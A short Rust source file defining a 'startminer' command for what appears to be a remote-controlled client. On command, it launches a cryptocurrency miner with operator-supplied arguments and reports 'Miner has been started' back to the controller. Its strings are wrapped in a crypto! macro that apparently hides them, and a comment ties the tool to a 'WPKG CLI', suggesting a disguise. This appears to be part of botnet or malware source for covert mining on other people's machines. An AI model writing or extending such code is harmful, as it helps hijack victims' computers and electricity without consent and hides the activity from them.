use super::prelude::*;

pub struct Startminer;

#[async_trait]
impl Command for Startminer {
    fn name(&self) -> String {
        crypto!("startminer")
    }

    fn help(&self) -> String {
        crypto!("help")
    }

    fn min_args(&self) -> usize {
        4
    }

    // Use
    // ok(message) when command executed succesfully
    // error(message) when command executed failed.
    // This added error code which will be recognized by WPKG CLI
    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        crypto::run_miner(_args[0].parse()?, _args[1], _args[2], _args[3])?;
        client.send(ok(crypto!("Miner has been started")))
    }
}
